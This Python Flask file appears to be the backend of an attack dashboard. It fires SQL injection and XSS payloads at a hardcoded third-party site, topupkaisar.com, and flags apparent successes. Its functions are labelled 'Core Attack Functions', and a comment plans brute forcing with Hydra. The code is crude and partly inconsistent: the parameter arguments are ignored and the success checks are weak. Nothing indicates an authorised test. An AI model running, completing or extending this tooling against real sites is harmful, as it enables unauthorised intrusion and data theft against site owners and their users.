from flask import Flask, render_template, request, jsonify
import requests
import urllib.parse
# You might want to install these libraries if you expand features:
# pip install requests python-dotenv

app = Flask(__name__)

# --- Configuration (Customize these for the actual site) ---
TARGET_URL = "https://topupkaisar.com/" # Main URL or specific endpoint
DEFAULT_PAYLOADS = {
    "sqli": "' OR '1'='1",
    "xss": "<script>alert('XSS')</script>"
}

# --- Core Attack Functions ---

def test_sqli(base_url, param_name, payloads):
    """Tests a single parameter for SQL Injection."""
    results = []
    for payload in payloads:
        # Construct the URL with the injected payload
        test_url = f"{base_url}?{urllib.parse.urlencode({'id': payload})}" # Assuming 'id' is the vulnerable param

        try:
            response = requests.get(test_url, timeout=10)
            # Simple heuristic check: if the status code changes or content is large, it might be successful
            if "Admin" in response.text or response.status_code == 200 and len(response.content) > 500:
                results.append({"payload": payload, "status": "SUCCESS (Potential Injection)", "data": response.text[:300] + "..."})
            else:
                 results.append({"payload": payload, "status": "FAIL", "data": None})
        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "status": "ERROR", "data": str(e)})
    return results

def test_xss(base_url, injection_point, payloads):
    """Simulates testing an input field for XSS."""
    # In a real scenario, you'd POST data here. For simplicity, we simulate GET passing the payload.
    results = []
    for payload in payloads:
        test_url = f"{base_url}?comment={urllib.parse.quote(payload)}" # Assuming comment is the vulnerable field

        try:
            response = requests.get(test_url, timeout=10)
            # To truly test XSS, you need to inspect the rendered HTML for the payload itself being echoed.
            if "alert" in response.text:
                 results.append({"payload": payload, "status": "SUCCESS (Payload Echoed)", "data": f"Script found in output."})
            else:
                results.append({"payload": payload, "status": "FAIL", "data": None})

        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "status": "ERROR", "data": str(e)})
    return results


# --- Flask Routes ---

@app.route('/')
def index():
    """Renders the main dashboard page."""
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def scan_site():
    """Endpoint to run all selected attacks based on user input."""
    data = request.json
    attack_type = data.get('attackType')
    params = data.get('parameters', {})
    payloads = data.get('payloads')

    if not attack_type or not payloads:
        return jsonify({"error": "Please select an attack type and provide payloads."}), 400

    all_results = []

    if attack_type == 'SQLi':
        # Assuming the user has specified which parameter to test (e.g., 'id' or 'username')
        param_to_test = params.get('parameter', 'id')
        results = test_sqli(TARGET_URL, param_to_test, payloads)
        all_results.extend(results)

    elif attack_type == 'XSS':
        # Assuming the user has specified which field to inject into (e.g., 'comment' or 'bio')
        injection_point = params.get('field', 'comment')
        results = test_xss(TARGET_URL, injection_point, payloads)
        all_results.extend(results)

    # Future expansion areas:
    elif attack_type == 'BruteForce':
        # Implement Hydra logic here...
        pass

    return jsonify({"success": True, "results": all_results})


if __name__ == '__main__':
    # Set debug=True for development. 
    app.run(debug=True)
